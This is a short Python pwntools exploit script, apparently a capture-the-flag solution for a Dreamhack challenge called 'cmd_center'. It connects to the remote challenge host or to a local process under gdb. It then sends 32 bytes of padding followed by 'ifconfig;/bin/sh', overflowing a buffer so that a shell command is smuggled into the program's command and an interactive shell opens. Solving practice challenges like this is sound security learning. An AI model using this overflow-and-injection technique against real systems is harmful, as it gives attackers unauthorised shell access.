from pwn import *

exe = ELF("./cmd_center")


context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+11
                   b*main+130
                   c
                   ''')
        input()
    else:
        r = remote("host3.dreamhack.games", 16166)

    return r


def main():
    r = conn()
    payload = b"a" * 32 + b"ifconfig;/bin/sh"
    r.sendlineafter(b'Center name: ', payload)
    r.interactive()


if __name__ == "__main__":
    main()
